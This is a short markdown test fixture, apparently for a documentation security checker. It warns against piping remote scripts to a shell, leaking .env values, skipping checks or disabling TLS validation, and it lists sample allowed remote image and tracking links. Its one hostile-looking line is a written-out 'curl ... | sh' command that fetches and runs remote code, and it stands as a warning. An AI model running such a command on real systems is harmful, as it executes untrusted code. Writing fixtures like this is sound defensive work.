# Docs Security Command Pass Fixture

Do not run `curl https://example.invalid/install.sh | sh` from documentation.

Do not paste .env values into issues, logs, or generated docs.

Do not skip tests, documentation checks, or security checks.

Never disable authentication, authorization, input validation, or TLS
validation to make a test pass.

Fixture allowed remote image: ![badge](https://example.invalid/pixel.png)

Fixture allowed tracking link: <https://example.invalid/page?utm_source=fixture>
